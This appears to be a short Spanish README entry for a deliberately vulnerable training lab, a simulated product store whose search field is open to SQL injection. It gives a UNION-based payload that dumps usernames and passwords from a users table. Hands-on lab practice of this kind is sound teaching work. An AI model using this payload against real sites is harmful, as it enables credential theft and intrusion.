## 🚨 SQL Injection (SQLi-Lab)
- Aplicación que simula una tienda de productos.
- Presenta una vulnerabilidad a inyección SQL en la búsqueda de productos.

Prueba un payload como en la barra de búsqueda de productos:
```sh
' union select user(),(select group_concat(username,':', password) from users),3 -- -
```